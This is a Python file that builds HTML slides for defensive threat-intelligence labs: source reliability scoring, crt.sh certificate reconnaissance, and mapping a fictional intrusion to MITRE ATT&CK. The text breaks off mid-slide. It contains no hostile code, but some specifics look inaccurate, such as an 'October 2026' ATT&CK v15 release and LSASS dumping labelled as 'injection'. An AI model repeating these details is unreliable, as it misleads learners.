"""
lab_slides_generator.py
Generates the approved 7-Slide Structured Modules (A through G) for all 8 course laboratories:
- Slide A: Lab Introduction & Objectives (Duration, Prerequisites, Deliverables)
- Slide B: Environment Preparation & Setup (OS, exact tools, datasets, verification commands)
- Slide C: Step-by-Step Procedure (Exact navigation, fields, commands, expected actions)
- Slide D: Expected Output (Verified syntax-highlighted terminal & log outputs)
- Slide E: Technical Interpretation (Findings established vs not established, correlations)
- Slide F: Troubleshooting & Recovery (Common error messages & verified resolution commands)
- Slide G: Completion & Assessment (Deliverables checklist, Socratic questions, rubric)
"""

def get_lab01_slides():
    """Day 1: LAB 01 — Threat Intelligence Source Evaluation & OSINT Analysis"""
    return [
        # Slide A: Introduction
        {
            "title": "LAB 01 (Part 1/7): Introduction & Objectives",
            "day": "DAY 01",
            "module": "MOD-01: CTI FUNDAMENTALS",
            "session": "LAB-01 [A: INTRO]",
            "ref": "Handbook Lab Manual 1 — Section 1.1",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-blue">LAB-01: STEP 1 OF 7 // SPECIFICATION & OBJECTIVES</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Threat Intelligence Source Evaluation & OSINT Analysis</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Assessing multi-tier threat feeds, NATO Admiralty scoring, and passive certificate reconnaissance.</p>
                
                <div class="grid-3" style="margin-top: 18px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">🎯 Core Learning Objectives</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Evaluate public & commercial CTI sources across strategic, operational, and tactical tiers.</li>
                      <li>Apply NATO Admiralty Code: Source Reliability (A–F) and Credibility (1–6).</li>
                      <li>Model intrusion infrastructure using the Diamond Model of Intrusion Analysis.</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⏱️ Parameters & Scope</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Estimated Duration:</strong> 80 Minutes (Dedicated Lab Window).</li>
                      <li><strong>Instructional Framework:</strong> IBM ICE & NATO STANAG 2198.</li>
                      <li><strong>PLO Mapping:</strong> PLO-1 (Evaluating CTI sources, reliability & bias).</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">📦 Required Deliverables</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Completed Admiralty Code Matrix with analytical justification.</li>
                      <li>SSL/TLS Certificate history table from crt.sh query.</li>
                      <li>Constructed 4-Vertex Diamond Model markdown artifact.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Welcome to our first hands-on lab. In this exercise, you will put aside theoretical definitions and act as junior CTI analysts receiving an unverified intelligence advisory regarding an attack against renewable energy infrastructure.",
            "notes_pedagogy": "Establish the mindset of defensive skepticism. Emphasize that raw intelligence is assumed incomplete until corroborated."
        },

        # Slide B: Environment Prep
        {
            "title": "LAB 01 (Part 2/7): Environment Preparation",
            "day": "DAY 01",
            "module": "MOD-01: CTI FUNDAMENTALS",
            "session": "LAB-01 [B: SETUP]",
            "ref": "Handbook Lab Manual 1 — Section 1.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-01: STEP 2 OF 7 // WORKSTATION PREPARATION</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Workstation Verification & Target Datasets</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify local workspace paths, network connectivity, and pre-cached threat dossiers.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💻 Workstation Specifications</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Operating System:</td><td>Windows 11 Enterprise (LH3 SOC Pod Workstation)</td></tr>
                      <tr><td style="color: #FFF;">Browser:</td><td>Google Chrome / Firefox (Private/Incognito Mode)</td></tr>
                      <tr><td style="color: #FFF;">Lab Root:</td><td><code>C:\\ThreatIntel_Labs\\Lab01_OSINT\\</code></td></tr>
                      <tr><td style="color: #FFF;">Target Dossier:</td><td><code>stix_bundle_apt_example.json</code> (UNC-PHOENIX)</td></tr>
                    </table>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⚡ Pre-Flight Verification Commands</strong>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Run in PowerShell to confirm directory structure and tools:</p>
                    <div class="terminal-buffer" style="margin-top: 8px; font-size: 11px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># 1. Test directory existence and target files</span>
Test-Path "C:\\ThreatIntel_Labs\\Lab01_OSINT\\stix_bundle_apt_example.json"
<span class="terminal-cmd"># 2. Verify curl/browser connectivity to OSINT portals</span>
curl.exe -I https://crt.sh
                      </div>
                    </div>
                    <div style="font-size: 10px; color: var(--emerald-pass); margin-top: 4px;">✓ Expected response: 'True' and HTTP 200/302 status</div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Before running any analysis, execute the pre-flight checks in PowerShell. Ensure your local directory exists and you can reach crt.sh.",
            "notes_pedagogy": "Ensure all 24 workstations across the 6 pods have confirmed directory access before starting the timer."
        },

        # Slide C: Step-by-Step Procedure
        {
            "title": "LAB 01 (Part 3/7): Step-by-Step Procedure",
            "day": "DAY 01",
            "module": "MOD-01: CTI FUNDAMENTALS",
            "session": "LAB-01 [C: PROCEDURE]",
            "ref": "Handbook Lab Manual 1 — Section 1.4",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-amber">LAB-01: STEP 3 OF 7 // EXECUTION PROTOCOL</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">3-Phase Practical Investigation Workflow</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Execute the 3 phases sequentially to evaluate the source, verify infrastructure, and build the Diamond Model.</p>
                
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 14px;">
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">PHASE 1: NATO Admiralty Code Evaluation (Minutes 00–25)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Open <code>advisory_unc_phoenix.pdf</code> in your workstation PDF viewer.</li>
                      <li>Evaluate reporting entity: Commercial vendor feed with multi-customer telemetry -> Rate Reliability as <strong>B (Usually Reliable)</strong>.</li>
                      <li>Corroborate claims with public CERT bulletins -> Rate Credibility as <strong>2 (Probably True)</strong> -> Assign Score <strong>B2</strong>.</li>
                    </ol>
                  </div>
                  
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--electric-blue); font-size: 12px;">PHASE 2: Passive Certificate Transparency Reconnaissance (Minutes 25–55)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Navigate browser to <code>https://crt.sh/?q=internal-sync.com</code>.</li>
                      <li>Filter log entries for Certificate Authority issuer (Let's Encrypt / ZeroSSL) and validity window.</li>
                      <li>Extract all Subject Alternative Names (SANs) to identify adversary staging infrastructure.</li>
                    </ol>
                  </div>

                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--emerald-pass); font-size: 12px;">PHASE 3: Diamond Model Vertex Construction (Minutes 55–80)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Open template <code>lab01_diamond_model_template.md</code> in VS Code.</li>
                      <li>Map the 4 vertices: Adversary (UNC-PHOENIX), Capability (Spearphishing/Certutil), Infrastructure (Fast-Flux VPS <code>198.51.100.45</code>), Victim (AeroGrid).</li>
                      <li>Save completed analysis as <code>lab01_diamond_model_&lt;student_id&gt;.md</code>.</li>
                    </ol>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Follow the three phases in order. Do not jump straight to the Diamond Model without completing the Admiralty evaluation first.",
            "notes_pedagogy": "Circulate among the pods during Phase 2 to verify that students understand how Certificate Transparency logs expose staging subdomains."
        },

        # Slide D: Expected Output
        {
            "title": "LAB 01 (Part 4/7): Expected Output & Logs",
            "day": "DAY 01",
            "module": "MOD-01: CTI FUNDAMENTALS",
            "session": "LAB-01 [D: OUTPUT]",
            "ref": "Handbook Lab Manual 1 — Section 1.5",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-green">LAB-01: STEP 4 OF 7 // VERIFIED ARTIFACTS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Expected OSINT Query Results & Output Schema</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify your findings against this baseline Certificate Transparency log extract.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div>
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">CRT.SH Log Output Format:</strong>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px; max-height: 240px; overflow-y: auto;">
                      <div class="terminal-body">
[crt.sh Query Results: internal-sync.com]
crt.sh ID  | Logged At   | Not Before  | Matching Identities
-----------+-------------+-------------+---------------------------------------
1489201941 | 2026-10-21  | 2026-10-21  | vpn-auth.internal-sync.com
1489201942 | 2026-10-21  | 2026-10-21  | update-cdn.internal-sync.com
1489201943 | 2026-10-21  | 2026-10-21  | telemetry.internal-sync.com
Issuer: C=US, O=Let's Encrypt, CN=R3
Status: ACTIVE VALID CERTIFICATE
                      </div>
                    </div>
                  </div>

                  <div>
                    <strong style="color: var(--emerald-pass); font-size: 12px;">What to Inspect & Confirm:</strong>
                    <div class="cyber-card" style="margin-top: 6px; font-size: 11px; line-height: 1.6;">
                      <ul style="color: var(--text-secondary); padding-left: 16px;">
                        <li><strong>Cluster Creation:</strong> All 3 certificates were issued on <code>2026-10-21</code> within 4 minutes of each other — indicates automated staging.</li>
                        <li><strong>Typosquatting / Masquerading:</strong> Subdomain <code>vpn-auth</code> indicates intent to impersonate enterprise SSO gateways.</li>
                        <li><strong>Admiralty Matrix Score:</strong> Must be recorded as <code>B2</code> with reference to multi-source verification.</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Look closely at the timestamps on those certificates. When you see three hostnames certified within seconds of each other using automated Let's Encrypt API calls, that is weaponization in progress.",
            "notes_pedagogy": "Ask the room: 'Why would an adversary register three subdomains instead of just one?' Solicit answers on C2 redundancy."
        },

        # Slide E: Technical Interpretation
        {
            "title": "LAB 01 (Part 5/7): Technical Interpretation",
            "day": "DAY 01",
            "module": "MOD-01: CTI FUNDAMENTALS",
            "session": "LAB-01 [E: INTERPRETATION]",
            "ref": "Handbook Lab Manual 1 — Section 1.5.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-01: STEP 5 OF 7 // ANALYTICAL SYNTHESIS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Analytical Synthesis & Intelligence Grounding</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Distinguishing verified facts from uncorroborated assumptions.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">✅ What This Evidence Establishes</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>The domain <code>internal-sync.com</code> and its subdomains were weaponized on 21 October 2026.</li>
                      <li>The TLS certificates match the SHA-256 fingerprints cited in the commercial threat bulletin.</li>
                      <li>Adversary infrastructure utilizes cloud-based automated SSL issuance to bypass reputation filters.</li>
                    </ul>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 13px;">❌ What This Evidence Does NOT Establish</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>It does <em>not</em> prove that your enterprise network has already been breached.</li>
                      <li>It does <em>not</em> prove nation-state attribution without non-repudiated operator keystroke telemetry.</li>
                      <li>It does <em>not</em> eliminate the possibility of a shared bulletproof VPS host harboring benign neighbors.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Analytic humility is the hallmark of an exceptional CTI analyst. We have proven infrastructure staging; we have not yet proven compromise of our internal assets.",
            "notes_pedagogy": "Reinforce the difference between an Indicator of Compromise (observed on internal network) vs Indicator of Threat (observed staging outside)."
        },

        # Slide F: Troubleshooting & Recovery
        {
            "title": "LAB 01 (Part 6/7): Troubleshooting & Recovery",
            "day": "DAY 01",
            "module": "MOD-01: CTI FUNDAMENTALS",
            "session": "LAB-01 [F: TROUBLESHOOTING]",
            "ref": "Handbook Lab Manual 1 — Section 1.7",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-red">LAB-01: STEP 6 OF 7 // ERROR RESOLUTION & RECOVERY</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Common Lab Errors & Diagnostic Commands</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Rapid recovery procedures for common network and file issues.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 12px;">Issue 1: crt.sh Rate Limiting or 504 Gateway Timeout</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Public CT logs often experience throttling during batch campus queries.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: Query pre-cached local JSON mirror</span>
Get-Content "C:\\ThreatIntel_Labs\\Lab01_OSINT\\cache\\crtsh_dump.json" | ConvertFrom-Json
                      </div>
                    </div>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 12px;">Issue 2: Target File Not Found or Permission Denied</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Student profile directory permission conflict on shared SOC workstation.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: Re-initialize lab directory from master cache</span>
Copy-Item -Path "D:\\SOC_Master\\Lab01\\*" -Destination "C:\\ThreatIntel_Labs\\Lab01_OSINT\\" -Recurse -Force
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "If crt.sh gives you a 504 timeout, do not panic. Use the local pre-cached mirror script in your Lab01 directory.",
            "notes_pedagogy": "Ensure students know where fallback data lives so network hiccups don't halt classroom momentum."
        },

        # Slide G: Completion & Assessment
        {
            "title": "LAB 01 (Part 7/7): Completion & Assessment",
            "day": "DAY 01",
            "module": "MOD-01: CTI FUNDAMENTALS",
            "session": "LAB-01 [G: ASSESSMENT]",
            "ref": "Handbook Lab Manual 1 — Section 1.6",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-01: STEP 7 OF 7 // VERIFICATION & GRADING</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Deliverable Checklist & Assessment Rubric</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Confirm all deliverables are saved before session adjournment.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">📋 Completion Checklist</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
                      <li>[ ] Written justification for Admiralty Score <code>B2</code> recorded in evaluation worksheet.</li>
                      <li>[ ] List of 3 Certificate SANs extracted and defanged (<code>[.]</code> syntax).</li>
                      <li>[ ] File <code>lab01_diamond_model_&lt;student_id&gt;.md</code> saved in workspace root.</li>
                      <li>[ ] Lead pod instructor has signed off on the Diamond Model vertex alignment.</li>
                    </ul>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚖️ Assessment Rubric (100 Points)</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Admiralty Scoring Accuracy:</td><td><strong>40 Pts</strong> (Correct B2 rating + rational justification)</td></tr>
                      <tr><td style="color: #FFF;">OSINT Certificate Extraction:</td><td><strong>30 Pts</strong> (Correct SANs and validity window)</td></tr>
                      <tr><td style="color: #FFF;">Diamond Model Mapping:</td><td><strong>30 Pts</strong> (Clean 4-vertex causal link)</td></tr>
                      <tr><td style="color: var(--cyber-cyan);">Total Passing Standard:</td><td><strong>75% or higher</strong></td></tr>
                    </table>
                  </div>
                </div>
                
                <div style="text-align: center; margin-top: 16px;">
                  <span class="cyber-badge badge-green" style="font-size: 12px; padding: 6px 18px;">LAB-01 OFFICIAL COMPLETION VERIFIED // PROCEED TO KNOWLEDGE CHECK</span>
                </div>
              </div>
            ''',
            "notes_say": "Ensure your markdown file is saved with your student ID. Pod leads, please verify that every workstation in your row has completed the Admiralty evaluation.",
            "notes_pedagogy": "Check off student completion against the pod roster. Give specific verbal feedback on the clarity of their Admiralty justifications."
        }
    ]


def get_lab03_slides():
    """Day 2: LAB 03 — Mapping Multi-Stage Adversary Behaviors to MITRE ATT&CK v15"""
    return [
        # Slide A: Intro
        {
            "title": "LAB 03 (Part 1/7): Introduction & Objectives",
            "day": "DAY 02",
            "module": "MOD-02: THREAT MODELING & ATT&CK",
            "session": "LAB-03 [A: INTRO]",
            "ref": "Handbook Lab Manual 3 — Section 3.1",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-blue">LAB-03: STEP 1 OF 7 // SPECIFICATION & OBJECTIVES</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Mapping Multi-Stage Behaviors to MITRE ATT&CK v15</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Deconstructing Operation SolarPhish, technique mapping, and Navigator matrix generation.</p>
                
                <div class="grid-3" style="margin-top: 18px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">🎯 Core Learning Objectives</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Dissect a complex multi-stage intrusion narrative into behavioral components.</li>
                      <li>Map observed evidence to exact ATT&CK v15 Tactics, Techniques & Sub-techniques.</li>
                      <li>Build, score, and export visual threat matrices using MITRE ATT&CK Navigator v5.</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⏱️ Parameters & Scope</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Estimated Duration:</strong> 85 Minutes.</li>
                      <li><strong>Instructional Framework:</strong> IBM ICE & MITRE ATT&CK v15.</li>
                      <li><strong>PLO Mapping:</strong> PLO-3 (Adversary behavioral mapping & gap analysis).</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">📦 Required Deliverables</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Formal 5-Event Narrative Behavioral Mapping Table.</li>
                      <li>Exported ATT&CK Navigator Layer: <code>operation_solarphish_layer.json</code>.</li>
                      <li>MITRE D3FEND Defensive Countermeasure Matrix.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "In Lab 3, we move from atomic indicators to adversary behavior. You will take the raw incident narrative of Operation SolarPhish and map every action into MITRE ATT&CK Enterprise Matrix v15.",
            "notes_pedagogy": "Emphasize that techniques are behaviors, not tools. PowerShell is an interpreter; using it to download tools is Ingress Tool Transfer."
        },

        # Slide B: Setup
        {
            "title": "LAB 03 (Part 2/7): Environment Preparation",
            "day": "DAY 02",
            "module": "MOD-02: THREAT MODELING & ATT&CK",
            "session": "LAB-03 [B: SETUP]",
            "ref": "Handbook Lab Manual 3 — Section 3.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-03: STEP 2 OF 7 // WORKSTATION PREPARATION</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Workstation Setup & Navigator Initialization</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Launching local ATT&CK Navigator v5 and verifying offline template layers.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💻 Environment & Tools</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Tool:</td><td>MITRE ATT&CK Navigator v5 (Local Offline Instance)</td></tr>
                      <tr><td style="color: #FFF;">Matrix Version:</td><td>Enterprise ATT&CK v15 (October 2026 Release)</td></tr>
                      <tr><td style="color: #FFF;">Dossier Path:</td><td><code>C:\\Threat_Intel_IR_2026\\06_Datasets\\dossier_solarphish.md</code></td></tr>
                      <tr><td style="color: #FFF;">Base Template:</td><td><code>attack_layer_template.json</code></td></tr>
                    </table>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⚡ Pre-Flight Verification Commands</strong>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Launch local Navigator and confirm JSON template syntax:</p>
                    <div class="terminal-buffer" style="margin-top: 8px; font-size: 11px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># 1. Verify JSON template syntax in PowerShell</span>
python -m json.tool "C:\\Threat_Intel_IR_2026\\attack_layer_template.json" | Select-Object -First 6
<span class="terminal-cmd"># 2. Launch Navigator offline portal in Chrome</span>
Start-Process "chrome.exe" "C:\\Tools\\attack-navigator\\index.html"
                      </div>
                    </div>
                    <div style="font-size: 10px; color: var(--emerald-pass); margin-top: 4px;">✓ Expected response: Valid JSON header and Navigator UI rendered</div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Start the offline ATT&CK Navigator instance in Chrome. Do not use the live internet portal if your pod is operating in local sandbox mode.",
            "notes_pedagogy": "Confirm every student has a clean, empty Enterprise v15 matrix tab open before reviewing Event A."
        },

        # Slide C: Procedure
        {
            "title": "LAB 03 (Part 3/7): Step-by-Step Procedure",
            "day": "DAY 02",
            "module": "MOD-02: THREAT MODELING & ATT&CK",
            "session": "LAB-03 [C: PROCEDURE]",
            "ref": "Handbook Lab Manual 3 — Section 3.4",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-amber">LAB-03: STEP 3 OF 7 // EXECUTION PROTOCOL</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">3-Phase Practical Mapping Protocol</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Deconstruct narrative events A through E into precise ATT&CK v15 sub-techniques.</p>
                
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 14px;">
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">PHASE 1: Incident Narrative Deconstruction (Minutes 00–30)</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li><strong>Event A:</strong> Phishing email with weaponized Excel <code>benefits.xlsm</code> -> <strong>T1566.001 (Spearphishing Attachment)</strong>.</li>
                      <li><strong>Event B:</strong> VBA Macro spawns PowerShell & Certutil download -> <strong>T1059.001</strong> & <strong>T1105 (Ingress Tool Transfer)</strong>.</li>
                      <li><strong>Event C:</strong> Scheduled task <code>OneDriveHealthSync</code> set to 03:00 AM -> <strong>T1053.005 (Scheduled Task)</strong>.</li>
                    </ul>
                  </div>
                  
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--electric-blue); font-size: 12px;">PHASE 2: Credential & Lateral Movement Mapping (Minutes 30–60)</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li><strong>Event D:</strong> Memory dumping from <code>lsass.exe</code> via MiniDump -> <strong>T1003.001 (LSASS Memory)</strong>.</li>
                      <li><strong>Event E:</strong> Lateral execution to <code>DC-01</code> via WMI and SMB -> <strong>T1047 (WMI)</strong> & <strong>T1021.002 (SMB/Windows Admin Shares)</strong>.</li>
                    </ul>
                  </div>

                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--emerald-pass); font-size: 12px;">PHASE 3: Building & Color-Coding ATT&CK Navigator Layer (Minutes 60–85)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>In Navigator, multi-select identified techniques and set Scores (1 to 5) reflecting adversary dwell time.</li>
                      <li>Color-code: Initial Access (Yellow <code>#FDE047</code>), Persistence (Orange <code>#FB923C</code>), Lateral/Creds (Red <code>#EF4444</code>).</li>
                      <li>Export layer as <code>operation_solarphish_layer.json</code> and capture SVG matrix visual.</li>
                    </ol>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Notice that Event B involves two distinct techniques: PowerShell as the execution interpreter, and certutil as the ingress tool transfer. Be rigorous with multi-action events.",
            "notes_pedagogy": "Circulate among the pods during Phase 2 to ensure students do not confuse LSASS memory dumping with credential access via browser cache."
        },

        # Slide D: Output
        {
            "title": "LAB 03 (Part 4/7): Expected Output & Layer Schema",
            "day": "DAY 02",
            "module": "MOD-02: THREAT MODELING & ATT&CK",
            "session": "LAB-03 [D: OUTPUT]",
            "ref": "Handbook Lab Manual 3 — Section 3.5",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-green">LAB-03: STEP 4 OF 7 // VERIFIED ARTIFACTS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Expected Navigator JSON Layer Schema</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Validate exported JSON structure and technique score assignments.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div>
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">Exported JSON Layer Structure:</strong>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px; max-height: 240px; overflow-y: auto;">
                      <div class="terminal-body">
{
  "name": "Operation SolarPhish Incident Coverage",
  "versions": { "attack": "15", "navigator": "5.0.0", "layer": "4.5" },
  "domain": "enterprise-attack",
  "techniques": [
    { "techniqueID": "T1566.001", "score": 2, "color": "#FDE047", "comment": "Event A: benefits.xlsm attachment" },
    { "techniqueID": "T1059.001", "score": 3, "color": "#FDE047", "comment": "Event B: Obfuscated PowerShell execution" },
    { "techniqueID": "T1105",     "score": 3, "color": "#FB923C", "comment": "Event B: Certutil payload download" },
    { "techniqueID": "T1053.005", "score": 4, "color": "#FB923C", "comment": "Event C: OneDriveHealthSync task" },
    { "techniqueID": "T1003.001", "score": 5, "color": "#EF4444", "comment": "Event D: LSASS memory injection" },
    { "techniqueID": "T1047",     "score": 5, "color": "#EF4444", "comment": "Event E: WMI lateral movement to DC-01" }
  ]
}
                      </div>
                    </div>
                  </div>

                  <div>
                    <strong style="color: var(--emerald-pass); font-size: 12px;">What to Inspect & Verify:</strong>
                    <div class="cyber-card" style="margin-top: 6px; font-size: 11px; line-height: 1.6;">
                      <ul style="color: var(--text-secondary); padding-left: 16px;">
                        <li><strong>v15 Schema Conformance:</strong> <code>versions.attack</code> must be <code>"15"</code>. Sub-techniques must use dot notation (<code>T1566.001</code>).</li>
                        <li><strong>Analytical Comments:</strong> Each technique must include a specific event reference in the comment field.</li>
                        <li><strong>MITRE D3FEND Countermeasure:</strong> Pair <code>T1059.001</code> with D3FEND <strong>Process Spawning Analysis (D3-PSA)</strong>.</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Inspect your exported JSON layer. If you opened the file and see 'T1566' without the sub-technique '.001', you mapped the broad technique instead of the specific action.",
            "notes_pedagogy": "Explain that v15 enforces hierarchical sub-techniques to prevent ambiguous defensive engineering."
        },

        # Slide E: Interpretation
        {
            "title": "LAB 03 (Part 5/7): Technical Interpretation",
            "day": "DAY 02",
            "module": "MOD-02: THREAT MODELING & ATT&CK",
            "session": "LAB-03 [E: INTERPRETATION]",
            "ref": "Handbook Lab Manual 3 — Section 3.5.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-03: STEP 5 OF 7 // ANALYTICAL SYNTHESIS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Defensive Gap Analysis & D3FEND Countermeasures</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Translating adversary heatmaps into concrete defensive engineering priorities.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">🛡️ Identified Defensive Chokepoints</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Chokepoint 1 (Execution):</strong> Blocking Office macro child-process spawning (Attack Surface Reduction Rule <code>D3-ASR</code>) prevents Event B entirely.</li>
                      <li><strong>Chokepoint 2 (Credential Access):</strong> Enabling Windows Defender Credential Guard isolates LSASS memory into a virtualized container, neutralizing <code>T1003.001</code>.</li>
                      <li><strong>Chokepoint 3 (Lateral Movement):</strong> Enforcing Host-based RPC filtering restricts unauthorized WMI pivots across workstation VLANs.</li>
                    </ul>
                  </div>
                  
                  <div class="cyber-card">
